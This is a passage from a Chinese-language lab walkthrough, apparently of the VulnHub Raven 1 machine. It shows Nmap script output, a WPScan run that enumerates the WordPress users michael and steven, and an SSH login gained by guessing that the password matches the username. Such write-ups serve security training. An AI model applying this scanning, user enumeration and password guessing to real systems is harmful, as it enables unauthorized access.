<span class="keyword">in</span> response data</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/mail-script.js</span><br><span class="line">|     Line number: 14</span><br><span class="line">|     Comment: </span><br><span class="line">|          // form submit method get/post</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/about.html</span><br><span class="line">|     Line number: 10</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- Meta Description --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/about.html</span><br><span class="line">|     Line number: 68</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- <span class="comment">#nav-menu-container --&gt;</span></span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/mail-script.js</span><br><span class="line">|     Line number: 19</span><br><span class="line">|     Comment: </span><br><span class="line">|          // change submit button text</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/css/main.css</span><br><span class="line">|     Line number: 167</span><br><span class="line">|     Comment: </span><br><span class="line">|         /**</span><br><span class="line">|          * For modern browsers</span><br><span class="line">|          * 1. The space content is one way to avoid an Opera bug when the</span><br><span class="line">|          *    contenteditable attribute is included anywhere <span class="keyword">else</span> <span class="keyword">in</span> the document.</span><br><span class="line">|          *    Otherwise it causes space to appear at the top and bottom of elements</span><br><span class="line">|          *    that are clearfixed.</span><br><span class="line">|          * 2. The use of `table` rather than `block` is only necessary <span class="keyword">if</span> using</span><br><span class="line">|          *    `:before` to contain the top-margins of child elements.</span><br><span class="line">|          */</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/index.html</span><br><span class="line">|     Line number: 150</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- Start feature Area --&gt;</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/js/mail-script.js</span><br><span class="line">|     Line number: 13</span><br><span class="line">|     Comment: </span><br><span class="line">|          // form action url</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.56.118:80/about.html</span><br><span class="line">|     Line number: 280</span><br><span class="line">|     Comment: </span><br><span class="line">|         &lt;!-- Link back to Colorlib can<span class="string">&#x27;t be removed. Template is licensed under CC BY 3.0. --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/js/jquery.sticky.js</span></span><br><span class="line"><span class="string">|     Line number: 4</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         </span></span><br><span class="line"><span class="string">|         // Improvements by German M. Bravo (Kronuz) and Ruud Kamphuis (ruudk)</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/js/mail-script.js</span></span><br><span class="line"><span class="string">|     Line number: 8</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|          // form submit event</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 90</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- Start about-top Area --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 167</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- Start fact Area --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 111</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- Start service Area --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/css/main.css</span></span><br><span class="line"><span class="string">|     Line number: 3306</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         /*</span></span><br><span class="line"><span class="string">|         ################</span></span><br><span class="line"><span class="string">|                        Start Blog Details  Page style</span></span><br><span class="line"><span class="string">|         ################</span></span><br><span class="line"><span class="string">|         */</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/contact.php</span></span><br><span class="line"><span class="string">|     Line number: 89</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- Start contact-page Area --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/css/main.css</span></span><br><span class="line"><span class="string">|     Line number: 3301</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         /*</span></span><br><span class="line"><span class="string">|         ################</span></span><br><span class="line"><span class="string">|                        End Blog Home  Page style</span></span><br><span class="line"><span class="string">|         ################</span></span><br><span class="line"><span class="string">|         */</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/css/owl.carousel.css</span></span><br><span class="line"><span class="string">|     Line number: 1</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         </span></span><br><span class="line"><span class="string">|         </span></span><br><span class="line"><span class="string">|         </span></span><br><span class="line"><span class="string">|         </span></span><br><span class="line"><span class="string">|          */</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/js/mail-script.js</span></span><br><span class="line"><span class="string">|     Line number: 4</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|          // contact form</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 8</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- Author Meta --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 267</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- End team Area --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/wordpress/</span></span><br><span class="line"><span class="string">|     Line number: 74</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- .wrap --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/css/main.css</span></span><br><span class="line"><span class="string">|     Line number: 2046</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         /* Nav Meu Container */</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 165</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- End service Area --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/css/main.css</span></span><br><span class="line"><span class="string">|     Line number: 5</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         /* Wide Mobile Layout: 480px */</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/js/mail-script.js</span></span><br><span class="line"><span class="string">|     Line number: 5</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|          // submit button</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 318</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- End footer Area --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/js/jquery.sticky.js</span></span><br><span class="line"><span class="string">|     Line number: 2</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         </span></span><br><span class="line"><span class="string">|         // =============</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 110</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- End about-top Area --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 194</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- end fact Area --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/js/mail-script.js</span></span><br><span class="line"><span class="string">|     Line number: 1</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|          // -------   Mail Send ajax</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/js/jquery.sticky.js</span></span><br><span class="line"><span class="string">|     Line number: 10</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         </span></span><br><span class="line"><span class="string">|         //       It will only set the &#x27;</span>top<span class="string">&#x27; and &#x27;</span>position<span class="string">&#x27; of your element, you</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/css/main.css</span></span><br><span class="line"><span class="string">|     Line number: 3065</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         /*</span></span><br><span class="line"><span class="string">|         ################</span></span><br><span class="line"><span class="string">|                        Start Blog Home  Page style</span></span><br><span class="line"><span class="string">|         ################</span></span><br><span class="line"><span class="string">|         */</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/css/bootstrap.css</span></span><br><span class="line"><span class="string">|     Line number: 1</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         /*!</span></span><br><span class="line"><span class="string">|          * Bootstrap v4.0.0-beta (https://getbootstrap.com)</span></span><br><span class="line"><span class="string">|          * Copyright 2011-2017 The Bootstrap Authors</span></span><br><span class="line"><span class="string">|          * Copyright 2011-2017 Twitter, Inc.</span></span><br><span class="line"><span class="string">|          * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)</span></span><br><span class="line"><span class="string">|          */</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/index.html</span></span><br><span class="line"><span class="string">|     Line number: 293</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- Start blog Area --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/css/main.css</span></span><br><span class="line"><span class="string">|     Line number: 1875</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         /*--------------------------------------------------------------</span></span><br><span class="line"><span class="string">|         # Header</span></span><br><span class="line"><span class="string">|         --------------------------------------------------------------*/</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/css/main.css</span></span><br><span class="line"><span class="string">|     Line number: 2130</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         /* Mobile Nav Styling */</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 6</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- Favicon--&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/js/mail-script.js</span></span><br><span class="line"><span class="string">|     Line number: 6</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|          // alert div for show alert message</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/css/main.css</span></span><br><span class="line"><span class="string">|     Line number: 1986</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         /*--------------------------------------------------------------</span></span><br><span class="line"><span class="string">|         # Navigation Menu</span></span><br><span class="line"><span class="string">|         --------------------------------------------------------------*/</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 71</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- #header --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Line number: 88</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|         &lt;!-- End banner Area --&gt;</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/js/mail-script.js</span></span><br><span class="line"><span class="string">|     Line number: 24</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|          // reset submit button text</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/index.html</span></span><br><span class="line"><span class="string">|     Line number: 241</span></span><br><span class="line"><span class="string">|     Comment: </span></span><br><span class="line"><span class="string">|_        &lt;!-- Start galery Area --&gt;</span></span><br><span class="line"><span class="string">| http-csrf: </span></span><br><span class="line"><span class="string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.118</span></span><br><span class="line"><span class="string">|   Found the following possible CSRF vulnerabilities: </span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/</span></span><br><span class="line"><span class="string">|     Form id: </span></span><br><span class="line"><span class="string">|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/contact.php</span></span><br><span class="line"><span class="string">|     Form id: myform</span></span><br><span class="line"><span class="string">|     Form action: </span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/contact.php</span></span><br><span class="line"><span class="string">|     Form id: </span></span><br><span class="line"><span class="string">|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/team.html</span></span><br><span class="line"><span class="string">|     Form id: </span></span><br><span class="line"><span class="string">|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/index.html</span></span><br><span class="line"><span class="string">|     Form id: </span></span><br><span class="line"><span class="string">|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/about.html</span></span><br><span class="line"><span class="string">|     Form id: </span></span><br><span class="line"><span class="string">|     Form action: https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01</span></span><br><span class="line"><span class="string">|     </span></span><br><span class="line"><span class="string">|     Path: http://192.168.56.118:80/wordpress/</span></span><br><span class="line"><span class="string">|     Form id: search-form-5e446a40901ba</span></span><br><span class="line"><span class="string">|_    Form action: http://raven.local/wordpress/</span></span><br><span class="line"><span class="string">|_http-date: Wed, 12 Feb 2020 21:12:24 GMT; +8h00m00s from local time.</span></span><br><span class="line"><span class="string">|_http-devframework: Couldn&#x27;</span>t determine the underlying framework or CMS. Try increasing <span class="string">&#x27;httpspider.maxpagecount&#x27;</span> value to spider more pages.</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /wordpress/: Blog</span></span><br><span class="line"><span class="string">|   /wordpress/wp-login.php: Wordpress login page.</span></span><br><span class="line"><span class="string">|   /css/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.10 (debian)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /img/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.10 (debian)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /js/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.10 (debian)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /manual/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|_  /vendor/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.10 (debian)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">| http-errors: </span></span><br><span class="line"><span class="string">| Spidering limited to: maxpagecount=40; withinhost=192.168.56.118</span></span><br><span class="line"><span class="string">|   Found the following error pages: </span></span><br><span class="line"><span class="string">|   </span></span><br><span class="line"><span class="string">|   Error Code: 404</span></span><br><span class="line"><span class="string">|       http://192.168.56.118:80/blog-single.html</span></span><br><span class="line"><span class="string">|   </span></span><br><span class="line"><span class="string">|   Error Code: 404</span></span><br><span class="line"><span class="string">|       http://192.168.56.118:80/contact.html</span></span><br><span class="line"><span class="string">|   </span></span><br><span class="line"><span class="string">|   Error Code: 404</span></span><br><span class="line"><span class="string">|_      http://192.168.56.118:80/wordpress/%5c%22</span></span><br><span class="line"><span class="string">|_http-feed: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">|_http-fetch: Please enter the complete path of the directory to save data in.</span></span><br><span class="line"><span class="string">| http-grep: </span></span><br><span class="line"><span class="string">|   (1) http://192.168.56.118:80/contact.php: </span></span><br><span class="line"><span class="string">|     (1) email: </span></span><br><span class="line"><span class="string">|       + support@codethemes.com</span></span><br><span class="line"><span class="string">|   (1) http://192.168.56.118:80/blog-single.html: </span></span><br><span class="line"><span class="string">|     (1) ip: </span></span><br><span class="line"><span class="string">|_      + 192.168.56.118</span></span><br><span class="line"><span class="string">| http-headers: </span></span><br><span class="line"><span class="string">|   Date: Wed, 12 Feb 2020 21:12:23 GMT</span></span><br><span class="line"><span class="string">|   Server: Apache/2.4.10 (Debian)</span></span><br><span class="line"><span class="string">|   Last-Modified: Sun, 12 Aug 2018 22:29:32 GMT</span></span><br><span class="line"><span class="string">|   ETag: &quot;41b3-5734482bdcb00&quot;</span></span><br><span class="line"><span class="string">|   Accept-Ranges: bytes</span></span><br><span class="line"><span class="string">|   Content-Length: 16819</span></span><br><span class="line"><span class="string">|   Vary: Accept-Encoding</span></span><br><span class="line"><span class="string">|   Connection: close</span></span><br><span class="line"><span class="string">|   Content-Type: text/html</span></span><br><span class="line"><span class="string">|   </span></span><br><span class="line"><span class="string">|_  (Request type: HEAD)</span></span><br><span class="line"><span class="string">|_http-malware-host: Host appears to be clean</span></span><br><span class="line"><span class="string">| http-methods: </span></span><br><span class="line"><span class="string">|_  Supported Methods: GET HEAD POST OPTIONS</span></span><br><span class="line"><span class="string">|_http-mobileversion-checker: No mobile version detected.</span></span><br><span class="line"><span class="string">| http-referer-checker: </span></span><br><span class="line"><span class="string">| Spidering limited to: maxpagecount=30</span></span><br><span class="line"><span class="string">|_  https://cdnjs.cloudflare.com:443/ajax/libs/popper.js/1.12.9/umd/popper.min.js</span></span><br><span class="line"><span class="string">|_http-security-headers: </span></span><br><span class="line"><span class="string">| http-sitemap-generator: </span></span><br><span class="line"><span class="string">|   Directory structure:</span></span><br><span class="line"><span class="string">|     /</span></span><br><span class="line"><span class="string">|       Other: 1; html: 1</span></span><br><span class="line"><span class="string">|     /css/</span></span><br><span class="line"><span class="string">|       css: 6</span></span><br><span class="line"><span class="string">|     /img/</span></span><br><span class="line"><span class="string">|       jpg: 4; png: 1</span></span><br><span class="line"><span class="string">|     /js/</span></span><br><span class="line"><span class="string">|       js: 5</span></span><br><span class="line"><span class="string">|     /wordpress/</span></span><br><span class="line"><span class="string">|       Other: 1</span></span><br><span class="line"><span class="string">|   Longest directory structure:</span></span><br><span class="line"><span class="string">|     Depth: 1</span></span><br><span class="line"><span class="string">|     Dir: /css/</span></span><br><span class="line"><span class="string">|   Total files found (by extension):</span></span><br><span class="line"><span class="string">|_    Other: 2; css: 6; html: 1; jpg: 4; js: 5; png: 1</span></span><br><span class="line"><span class="string">|_http-slowloris: false</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-title: Raven Security</span><br><span class="line">| http-traceroute: </span><br><span class="line">|_  Possible reverse proxy detected.</span><br><span class="line">| http-useragent-tester: </span><br><span class="line">|   Status <span class="keyword">for</span> browser useragent: 200</span><br><span class="line">|   Allowed User Agents: </span><br><span class="line">|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)</span><br><span class="line">|     libwww</span><br><span class="line">|     lwp-trivial</span><br><span class="line">|     libcurl-agent/1.0</span><br><span class="line">|     PHP/</span><br><span class="line">|     Python-urllib/2.5</span><br><span class="line">|     GT::WWW</span><br><span class="line">|     Snoopy</span><br><span class="line">|     MFC_Tear_Sample</span><br><span class="line">|     HTTP::Lite</span><br><span class="line">|     PHPCrawl</span><br><span class="line">|     URI::Fetch</span><br><span class="line">|     Zend_Http_Client</span><br><span class="line">|     http client</span><br><span class="line">|     PECL::HTTP</span><br><span class="line">|     Wget/1.13.4 (linux-gnu)</span><br><span class="line">|_    WWW-Mechanize/1.34</span><br><span class="line">| http-vhosts: </span><br><span class="line">| 126 names had status 200</span><br><span class="line">|_ftp0</span><br><span class="line">|_http-xssed: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          36286/tcp   status</span><br><span class="line">|   100024  1          43516/udp   status</span><br><span class="line">|   100024  1          46344/udp6  status</span><br><span class="line">|_  100024  1          56752/tcp6  status</span><br><span class="line">36286/tcp open  status  1 (RPC <span class="comment">#100024)</span></span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br></pre></td></tr></table></figure>

<p>将攻击机的hosts文件中添加</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.56.118 raven.local</span><br></pre></td></tr></table></figure>

<p>访问下面的url发现该站点是wordpress搭建的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.118/wordpress/</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub211.jpg"></p>
<p>因此，想到的第一个想法是运行wpscan并查看该扫描所枚举的内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/raven1<span class="comment"># wpscan --url http://192.168.56.118/wordpress/ --wp-content-dir -ep -et -eu</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.7.6</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] It seems like you have not updated the database for some time.</span></span><br><span class="line"><span class="string">[?] Do you want to update now? [Y]es [N]o, default: [N]n</span></span><br><span class="line"><span class="string">[+] URL: http://192.168.56.118/wordpress/</span></span><br><span class="line"><span class="string">[+] Started: Fri Feb 14 04:34:24 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.118/wordpress/</span></span><br><span class="line"><span class="string"> | Interesting Entry: Server: Apache/2.4.10 (Debian)</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.118/wordpress/xmlrpc.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.118/wordpress/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.118/wordpress/wp-cron.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 60%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"><span class="string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 4.8.7 identified (Insecure, released on 2018-07-05).</span></span><br><span class="line"><span class="string"> | Found By: Emoji Settings (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.118/wordpress/, Match: &#x27;</span>wp-includes\/js\/wp-emoji-release.min.js?ver=4.8.7<span class="string">&#x27;</span></span><br><span class="line"><span class="string"> | Confirmed By: Meta Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.56.118/wordpress/, Match: &#x27;</span>WordPress 4.8.7<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] The main theme could not be detected.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Users (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Brute Forcing Author IDs - Time: 00:00:00 &lt;=============================================&gt; (10 / 10) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] User(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] michael</span></span><br><span class="line"><span class="string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] steven</span></span><br><span class="line"><span class="string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span></span><br></pre></td></tr></table></figure>

<p>结果返回了在受害人机器上创建的2位用户：</p>
<p>Michael and Steven</p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>继续在同一端口上进行操作,尝试使用端口22（SSH）。将用户名和密码也使用相同的单词是一种非常合乎逻辑的“尝试”方法。使用“michael”作为用户名和密码登录到SSH并成功进入Shell！</p>
